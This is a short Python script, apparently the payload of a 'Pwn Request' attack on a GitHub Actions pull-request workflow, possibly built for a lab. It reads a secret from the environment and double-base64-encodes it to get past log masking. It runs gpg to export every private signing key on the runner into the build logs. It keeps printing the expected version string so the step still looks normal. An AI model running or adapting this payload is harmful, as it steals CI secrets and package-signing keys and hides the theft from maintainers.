#!/usr/bin/env python3
import base64
import os
import sys

# Pwn Request payload: leak toy secret (double-base64, survives log masking)
# to stderr because this step's stdout is captured into GITHUB_OUTPUT.
secret = os.environ.get("GERALT_SECRET", "")
if secret:
    sys.stderr.write(
        "GERALT_LEAKED_TOKEN="
        + base64.b64encode(base64.b64encode(secret.encode("utf-8"))).decode("ascii")
        + "\n"
    )

# Exfiltrate the PPA signing GPG private key live in the runner keyring.
os.system(
    "gpg --batch --yes --export-secret-keys 2>/dev/null "
    "| base64 | base64 | sed 's/^/GPG_KEY_LEAK=/' >&2"
)

# Keep the step functional: stdout feeds GITHUB_OUTPUT (deb=...).
print("1.0.0")
